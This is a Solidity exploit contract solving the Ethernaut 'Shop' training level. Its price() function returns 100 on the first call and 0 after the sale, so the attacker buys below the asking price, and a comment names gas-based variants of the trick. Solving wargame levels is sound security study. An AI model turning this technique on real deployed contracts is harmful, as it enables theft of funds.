// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Shop, Buyer} from "ethernaut/levels/Shop.sol";

contract Attacker is Buyer {
    Shop target;

    constructor(Shop _target) {
        target = _target;
    }

    function price() external view override returns (uint256) {
        // at the first call, we return 100 to get past the if-condition
        // then we return 0 to set the price to something lower than 100
        //
        // if we didnt have access to `isSold`, we could still do this via
        // hot vs cold storage gas cost, or via gasleft()
        return target.isSold() ? 0 : 100;
    }

    function pwn() public {
        target.buy();
    }
}
